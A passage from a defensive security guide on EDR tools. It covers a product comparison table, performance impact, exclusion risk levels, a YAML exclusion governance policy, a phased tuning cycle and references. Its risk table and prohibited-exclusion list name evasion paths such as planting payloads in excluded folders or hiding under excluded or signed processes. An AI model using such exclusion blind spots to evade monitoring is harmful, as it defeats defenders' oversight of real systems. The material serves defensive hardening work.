| **FIM** | Via artifacts | Built-in | Built-in (core feature) |
| **Compliance scanning** | Limited | Limited | Extensive |
| **Scalability** | 100k+ endpoints | Cloud-native, unlimited | Cluster architecture |
| **Community size** | Growing | Moderate | Large, established |
| **Best for** | Incident response teams | MSSPs and security engineers | Compliance-focused SOCs |

---

## 19. EDR Performance Tuning e Gestione Esclusioni

### 19.1 Impatto Prestazionale dell'EDR

EDR agents consume system resources through kernel-level hooking, event processing, and telemetry transmission. Improperly configured agents can degrade application performance, particularly on:

- **Database servers**: File I/O monitoring on high-throughput data files creates contention
- **Build systems**: Compilation generates thousands of process creation and file write events per second
- **Developer workstations**: IDE operations, Docker builds, and test runners produce high event volumes
- **High-frequency trading systems**: Microsecond latency requirements conflict with syscall interception overhead

### 19.2 Strategia di Esclusione Strutturata

Exclusions reduce EDR overhead but simultaneously create blind spots. Every exclusion is a potential evasion path for adversaries. A disciplined approach is essential:

**Exclusion types and risk levels:**

| Exclusion Type | Example | Risk Level | Recommendation |
|---------------|---------|------------|----------------|
| Path exclusion | `C:\Database\*.mdf` | HIGH | Adversaries can plant payloads in excluded paths |
| Process exclusion | `sqlserver.exe` | CRITICAL | Any child process of excluded process is invisible |
| Extension exclusion | `*.log` | MEDIUM | Malware can use excluded extensions |
| Hash exclusion | Specific file SHA256 | LOW | Narrow scope, minimal blind spot |
| Signed process exclusion | Publisher: "Microsoft" | MEDIUM | LOLBin abuse from signed processes |

**Exclusion governance framework:**

```yaml
exclusion_policy:
  approval_required: true
  approver: "Security Engineering Lead"
  
  mandatory_fields:
    - business_justification
    - performance_impact_evidence
    - risk_assessment
    - review_date  # Max 90 days from creation
    - owner        # Team responsible for the excluded application
  
  audit_requirements:
    - frequency: monthly
    - check: "Are excluded paths/processes generating suspicious activity?"
    - action: "Review all exclusions older than 90 days"
    - logging: "All exclusion changes logged to SIEM"
  
  prohibited_exclusions:
    - "Entire user profile directories (C:\\Users\\*)"
    - "Temp directories without extension filtering"
    - "System32 or SysWOW64 paths"
    - "PowerShell or cmd.exe processes"
    - "Any process by name only (without full path)"
```

### 19.3 Tuning Iterativo e Riduzione Falsi Positivi

A structured tuning cycle minimizes alert noise while preserving detection fidelity:

**Phase 1 (Week 1-2): Monitor-only deployment** — Deploy EDR in detection-only mode (no blocking). Collect baseline alert data. Identify the top 20 highest-volume alert sources.

**Phase 2 (Week 3-4): Root cause analysis** — For each high-volume alert source, determine: Is the detection logic too broad? Is the environment behavior genuinely anomalous? Is the application legitimately performing the flagged action?

**Phase 3 (Week 5-6): Targeted exclusions** — Create narrowly scoped exclusions with full documentation. Prefer hash-based or full-path exclusions over broad directory/process exclusions. Log all exclusion creation to the SIEM.

**Phase 4 (Week 7-8): Enable prevention mode** — Activate blocking for high-confidence detection rules. Keep medium-confidence rules in detect-only mode. Monitor for business process disruption.

**Ongoing: Monthly review cycle** — Review suppressed alert categories for emerging threats that may now be hidden. Audit all existing exclusions for continued necessity. Assess false positive rate trend and adjust thresholds. Update detection rules based on new threat intelligence. Target: false positive rate below 20% of total alert volume.

---

## Riferimenti e Risorse

### Standards and Frameworks

- MITRE ATT&CK: https://attack.mitre.org/
- MITRE D3FEND (defensive techniques): https://d3fend.mitre.org/
- NIST SP 800-83 Rev 1: Guide to Malware Incident Prevention and Handling
- NIST SP 800-94: Guide to Intrusion Detection and Prevention Systems

### Open-Source Tools

- Wazuh: https://wazuh.com/
- Sysmon: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- Sigma Rules: https://github.com/SigmaHQ/sigma
- YARA: https://github.com/VirusTotal/yara
- Atomic Red Team: https://github.com/redcanaryco/atomic-red-team
- Elastic Detection Rules: https://github.com/elastic/detection-rules
- LOLBAS Project: https://lolbas-project.github.io/

### Research Papers and Resources

- CrowdStrike Threat Reports (annual): https://www.crowdstrike.com/resources/reports/
- MITRE Engenuity ATT&CK Evaluations: https://attackevals.mitre-engenuity.org/
- The DFIR Report: https://thedfirreport.com/
- Elastic Threat Research: https://www.elastic.co/security-labs

---

**Nota conclusiva**: EDR is not a silver bullet. It is one layer in a defense-in-depth strategy. The most sophisticated adversaries (nation-state APTs) routinely develop EDR-specific evasion techniques. The defensive advantage lies in continuous detection engineering, purple team validation, and treating EDR as a visibility platform rather than a prevention-only tool. The cat-and-mouse game between adversary tradecraft and detection engineering is perpetual — the goal is to raise the cost of attack, not to achieve perfect prevention.
